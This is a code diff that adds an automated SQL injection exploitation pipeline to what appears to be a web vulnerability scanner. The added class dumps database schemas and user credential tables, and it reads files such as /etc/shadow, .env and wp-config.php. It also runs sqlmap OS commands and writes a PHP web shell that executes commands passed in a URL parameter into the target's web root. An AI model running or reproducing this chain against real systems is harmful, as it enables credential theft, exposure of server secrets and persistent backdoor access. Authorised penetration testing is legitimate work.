@@ -1058,6 +1058,38 @@ class SQLInjectionScanner(BaseScanner):
                 confidence="confirmed",
             )
 
+        # Full exploitation pipeline after SQLMap confirmation
+        if result.get("success") and self.results.get("cfg", {}).get("exploitation", {}).get("enabled"):
+            exploiter = SQLiExploiter(session=self.session)
+            exploit_report = exploiter.full_exploitation_pipeline(url, param)
+            if exploit_report.get("credentials"):
+                self.report_finding(
+                    vuln_type="SQL Injection — Credentials Extracted",
+                    url=url,
+                    param=param,
+                    payload="UNION SELECT user,password FROM users",
+                    severity="Critical",
+                    evidence=f"Extracted {len(exploit_report['credentials'])} credential(s): "
+                             + str(exploit_report['credentials'][:3])[:400],
+                    extra={"exploitation": exploit_report},
+                    detection_method="sqli_exploiter",
+                    verified=True,
+                    confidence="confirmed",
+                )
+            if exploit_report.get("web_shell"):
+                self.report_finding(
+                    vuln_type="SQL Injection → Web Shell (RCE)",
+                    url=url,
+                    param=param,
+                    payload="UNION SELECT shell INTO OUTFILE",
+                    severity="Critical",
+                    evidence=f"Web shell deployed: {exploit_report['web_shell']}",
+                    extra={"shell_url": exploit_report["web_shell"], "exploitation": exploit_report},
+                    detection_method="sqli_webshell",
+                    verified=True,
+                    confidence="confirmed",
+                )
+
 
 def run(url, session=None, results=None, debug=False, **kwargs):
     scanner = SQLInjectionScanner(session, results, debug)
@@ -1549,3 +1581,363 @@ class SQLMapBridge:
             return {"success": False, "error": f"sqlmap {self._TIMEOUT}s'de zaman aşımı"}
         except Exception as exc:
             return {"success": False, "error": str(exc)}
+
+
+# =============================================================================
+# SQLiExploiter — Full SQLi Exploitation Pipeline
+# =============================================================================
+
+class SQLiExploiter:
+    """
+    Full SQLi exploitation pipeline — runs after confirmed detection.
+
+    Modes (escalating):
+    1. dump_schema() — enumerate databases, tables, columns
+    2. dump_credentials() — dump user/password tables directly
+    3. attempt_os_shell() — escalate to OS command execution via SQLMap
+    4. attempt_file_write() — write web shell to filesystem (MySQL INTO OUTFILE)
+    5. attempt_file_read() — read sensitive files (/etc/passwd, wp-config.php, .env)
+
+    Uses SQLMap CLI as the execution engine where available.
+    Also implements direct UNION-based extraction as fallback.
+
+    SOLID: Single Responsibility — exploitation only (detection is SQLInjectionScanner's job)
+    """
+
+    _SENSITIVE_TABLES = re.compile(
+        r'(?i)(user|account|admin|member|customer|employee|staff|'
+        r'password|credential|auth|login|token|secret|api_key|session|'
+        r'oauth|payment|credit|billing|personal|private)'
+    )
+
+    _FILE_TARGETS = [
+        "/etc/passwd",
+        "/etc/shadow",
+        "/var/www/html/.env",
+        "/var/www/html/wp-config.php",
+        "/var/www/html/config/database.php",
+        "/var/www/html/config/database.yml",
+        "/var/www/html/settings.py",
+        "/var/www/html/config.php",
+        "C:/Windows/win.ini",
+        "C:/inetpub/wwwroot/web.config",
+        "C:/xampp/htdocs/.env",
+    ]
+
+    def __init__(self, session=None, timeout: int = 120):
+        import requests as _req
+        self.session = session or _req.Session()
+        self.timeout = timeout
+
+    @staticmethod
+    def _inject_fn(url: str, param: str, payload: str) -> str:
+        """Build injection URL by replacing the target parameter value."""
+        parsed = urlparse(url)
+        params = dict(parse_qsl(parsed.query))
+        params[param] = payload
+        return urlunparse(parsed._replace(query=urlencode(params)))
+
+    def dump_schema(self, url: str, param: str, db_hint: str = "mysql") -> Dict[str, Any]:
+        """
+        Extract complete DB schema via UNION-based injection.
+
+        Returns:
+            {
+                "databases": [...],
+                "tables": [...],
+                "sensitive_tables": [...],
+                "columns": {table: [cols]},
+            }
+        """
+        extractor = SchemaExtractor()
+        schema = extractor.run_schema_extraction(url, param, self.session, self._inject_fn, db_hint)
+
+        # Enumerate all databases (MySQL/MariaDB/PostgreSQL)
+        databases: List[str] = []
+        if db_hint in ("mysql", "mariadb"):
+            db_query = (
+                "' UNION SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR '|'),NULL "
+                "FROM information_schema.schemata-- -"
+            )
+            try:
+                r = self.session.get(self._inject_fn(url, param, db_query), timeout=10)
+                databases = re.findall(r'([a-z_][a-z0-9_]{1,64})\|', r.text, re.I)
+            except Exception:
+                pass
+
+        schema["databases"] = databases or schema.get("tables", [])
+        return schema
+
+    def dump_credentials(
+        self, url: str, param: str, db_hint: str = "mysql"
+    ) -> List[Dict[str, str]]:
+        """
+        Directly extract username/password from sensitive tables.
+
+        Strategy:
+        1. Obtain schema to identify sensitive tables.
+        2. For each sensitive table, detect username/password column names via regex.
+        3. Extract up to 50 rows per table via UNION SELECT.
+
+        Returns:
+            [{"table": "users", "username": "admin", "password": "hash", "url": "..."}]
+        """
+        results: List[Dict[str, str]] = []
+        schema = self.dump_schema(url, param, db_hint)
+
+        for table in schema.get("sensitive_tables", [])[:5]:
+            cols = schema.get("columns", {}).get(table, [])
+            if not cols:
+                continue
+
+            # Identify user/pass columns heuristically
+            user_col = next(
+                (c for c in cols if re.search(r'(?i)user|login|email|name', c)), None
+            )
+            pass_col = next(
+                (c for c in cols if re.search(r'(?i)pass|hash|secret|token', c)), None
+            )
+
+            if not user_col or not pass_col:
+                continue
+
+            # Build dump query per DB dialect
+            if db_hint in ("mysql", "mariadb"):
+                query = (
+                    f"' UNION SELECT GROUP_CONCAT({user_col},'§',{pass_col} ORDER BY 1 SEPARATOR '|'),NULL "
+                    f"FROM {table} LIMIT 50-- -"
+                )
+            else:
+                query = f"' UNION SELECT {user_col}||'§'||{pass_col},NULL FROM {table} LIMIT 50-- -"
+
+            try:
+                r = self.session.get(self._inject_fn(url, param, query), timeout=10)
+                rows = re.findall(r'([^|§\n]{1,100})§([^|§\n]{1,100})', r.text)
+                for uname, pwd in rows[:50]:
+                    results.append({
+                        "table": table,
+                        "username": uname.strip(),
+                        "password": pwd.strip(),
+                        "url": url,
+                    })
+            except Exception:
+                continue
+
+        return results
+
+    def attempt_os_shell(
+        self,
+        url: str,
+        param: str,
+        extra_sqlmap_args: Optional[List[str]] = None,
+        timeout: int = 180,
+    ) -> Dict[str, Any]:
+        """
+        Escalate SQLi to OS command execution via SQLMap --os-cmd.
+
+        Runs: sqlmap -u URL -p PARAM --os-cmd id --batch --level=3 --risk=2
+        Captures first command output (id/whoami).
+
+        Returns:
+            {"success": bool, "technique": str, "command_output": str}
+        """
+        import subprocess
+        import shutil
+        import tempfile
+
+        sqlmap_bin = shutil.which("sqlmap")
+        if not sqlmap_bin:
+            return {"success": False, "error": "sqlmap not in PATH"}
+
+        out_dir = tempfile.mkdtemp(prefix="ws_sqlmap_osshell_")
+
+        cmd = [
+            sqlmap_bin, "-u", url, "-p", param,
+            "--os-cmd", "id",
+            "--batch",
+            "--level=3",
+            "--risk=2",
+            "--technique=BEUSTQ",
+            f"--output-dir={out_dir}",
+            "--disable-coloring",
+        ]
+        if extra_sqlmap_args:
+            cmd.extend(extra_sqlmap_args)
+
+        try:
+            proc = subprocess.run(
+                cmd, capture_output=True, text=True, encoding="utf-8",
+                errors="replace", timeout=timeout, check=False,
+            )
+            output = proc.stdout + "\n" + proc.stderr
+            m = re.search(
+                r"command standard output:\s*'([^']+)'|uid=\d+\([^)]+\)",
+                output, re.I,
+            )
+            if m:
+                return {
+                    "success": True,
+                    "technique": "sqlmap_os_cmd",
+                    "command": "id",
+                    "command_output": m.group(0)[:500],
+                    "sqlmap_output": output[:3000],
+                }
+            return {
+                "success": False,
+                "error": "No command output found",
+                "sqlmap_output": output[:2000],
+            }
+        except subprocess.TimeoutExpired:
+            return {"success": False, "error": f"SQLMap timed out after {timeout}s"}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+        finally:
+            import shutil as _sh
+            try:
+                _sh.rmtree(out_dir)
+            except Exception:
+                pass
+
+    def attempt_file_read(
+        self, url: str, param: str, db_hint: str = "mysql"
+    ) -> Dict[str, str]:
+        """
+        Read sensitive server files via SQLi LOAD_FILE() (MySQL) or pg_read_file (PostgreSQL).
+
+        Returns:
+            {file_path: file_content_excerpt, ...}
+        """
+        results: Dict[str, str] = {}
+
+        for fpath in self._FILE_TARGETS[:8]:
+            if db_hint in ("mysql", "mariadb"):
+                query = f"' UNION SELECT LOAD_FILE('{fpath}'),NULL-- -"
+            elif db_hint == "postgresql":
+                query = f"' UNION SELECT pg_read_file('{fpath}',0,10000),NULL-- -"
+            else:
+                continue
+
+            try:
+                r = self.session.get(self._inject_fn(url, param, query), timeout=10)
+                content_indicators = (
+                    "root:x:", "[extensions]", "DB_PASSWORD",
+                    "SECRET_KEY", "define('DB_",
+                )
+                if any(ind in r.text for ind in content_indicators):
+                    # Locate the first indicator and extract surrounding context
+                    positions = [r.text.find(ind) for ind in content_indicators if ind in r.text]
+                    pos = min(p for p in positions if p >= 0)
+                    excerpt = r.text[max(0, pos - 50): min(len(r.text), pos + 1000)]
+                    results[fpath] = excerpt.strip()
+            except Exception:
+                continue
+
+        return results
+
+    def attempt_file_write(
+        self,
+        url: str,
+        param: str,
+        webroot: str = "/var/www/html",
+        db_hint: str = "mysql",
+    ) -> Optional[str]:
+        """
+        Write a web shell via MySQL INTO OUTFILE (requires FILE privilege).
+
+        Returns the shell URL if the shell is successfully deployed and responds,
+        otherwise None.
+        """
+        import hashlib
+        import time as _time
+
+        shell_name = f"ws_{hashlib.md5(str(_time.time()).encode()).hexdigest()[:8]}.php"
+        shell_path = f"{webroot.rstrip('/')}/{shell_name}"
+        shell_content = (
+            "<?php if(isset($_GET['c'])){"
+            "echo '<pre>'.shell_exec($_GET['c']).'</pre>';} ?>"
+        )
+        shell_content_escaped = shell_content.replace("'", "\\'")
+
+        if db_hint not in ("mysql", "mariadb"):
+            return None
+
+        query = (
+            f"' UNION SELECT '{shell_content_escaped}',NULL "
+            f"INTO OUTFILE '{shell_path}'-- -"
+        )
+
+        try:
+            self.session.get(self._inject_fn(url, param, query), timeout=10)
+            # Verify shell is reachable
+            parsed = urlparse(url)
+            shell_url = f"{parsed.scheme}://{parsed.netloc}/{shell_name}"
+            r = self.session.get(f"{shell_url}?c=id", timeout=10)
+            if "uid=" in r.text or r.status_code == 200:
+                return shell_url
+        except Exception:
+            pass
+
+        return None
+
+    def full_exploitation_pipeline(
+        self,
+        url: str,
+        param: str,
+        db_hint: str = "mysql",
+        webroot: str = "/var/www/html",
+    ) -> Dict[str, Any]:
+        """
+        Run all exploitation stages in order, escalating on each success.
+
+        Stages:
+        1. Schema dump
+        2. Credential extraction
+        3. Sensitive file reads
+        4. OS shell escalation via SQLMap
+        5. Web shell drop (only when file access or OS shell succeeded)
+
+        Returns a comprehensive exploitation report dict.
+        """
+        report: Dict[str, Any] = {
+            "url": url,
+            "param": param,
+            "db_hint": db_hint,
+            "schema": {},
+            "credentials": [],
+            "file_reads": {},
+            "os_shell": {},
+            "web_shell": None,
+        }
+
+        # Stage 1: Schema dump
+        try:
+            report["schema"] = self.dump_schema(url, param, db_hint)
+        except Exception as e:
+            logger.debug(f"[SQLiExploiter] schema dump failed: {e!r}")
+
+        # Stage 2: Credential extraction
+        try:
+            report["credentials"] = self.dump_credentials(url, param, db_hint)
+        except Exception as e:
+            logger.debug(f"[SQLiExploiter] credential dump failed: {e!r}")
+
+        # Stage 3: File read
+        try:
+            report["file_reads"] = self.attempt_file_read(url, param, db_hint)
+        except Exception as e:
+            logger.debug(f"[SQLiExploiter] file read failed: {e!r}")
+
+        # Stage 4: OS shell escalation
+        try:
+            report["os_shell"] = self.attempt_os_shell(url, param)
+        except Exception as e:
+            logger.debug(f"[SQLiExploiter] os shell failed: {e!r}")
+
+        # Stage 5: Web shell drop (gated on prior file/OS access evidence)
+        if report["os_shell"].get("success") or report["file_reads"]:
+            try:
+                report["web_shell"] = self.attempt_file_write(url, param, webroot, db_hint)
+            except Exception as e:
+                logger.debug(f"[SQLiExploiter] web shell failed: {e!r}")
+
+        return report
